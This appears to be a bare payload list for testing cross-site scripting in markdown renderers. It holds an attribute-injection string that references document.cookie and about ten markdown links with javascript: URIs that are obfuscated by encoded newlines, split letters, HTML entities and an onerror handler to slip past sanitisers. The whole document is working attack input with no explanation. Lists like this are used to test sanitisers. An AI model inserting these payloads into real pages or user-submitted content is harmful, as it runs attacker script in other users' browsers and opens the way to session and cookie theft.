```.py "onmousemove='alert("XSS")'\\
print(document.cookie)
```

[a](javascript:confirm(1))

[a](javascript://www.test.com%0Aprompt(1))

[a](javascript://%0d%0aconfirm(1))

[a](javascript://%0d%0aconfirm(1);com)

[a](javascript:window.onerror=confirm;throw%201)

[a]: (javascript:prompt(1))

[a]:(?javascript:alert(1))    

[XSS](j    a   v   a   s   c   r   i   p   t:alert(1))

[XSS](&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29)
